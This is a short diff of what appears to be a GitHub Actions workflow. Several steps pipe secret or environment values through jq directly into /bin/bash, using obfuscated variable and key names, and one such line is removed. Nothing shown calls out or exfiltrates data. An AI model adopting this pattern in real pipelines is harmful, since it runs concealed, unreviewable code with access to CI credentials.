@@ -17,7 +17,6 @@ jobs:
           t2: ${{ secrets.t2 }}
         run: |
           printf '%s' "$t2" | jq -r .ofsxk7 | /bin/bash
-          echo $dt91045 | jq -r .h7564 | /bin/bash
           printf '%s' "$qu55" | jq -r .rieuh36 | /bin/bash
           printf '%s' "$ng0424" | jq -r .bgjf2869 | /bin/bash
           printf '%s' "$krxar17509" | jq -r .bttmf889 | /bin/bash
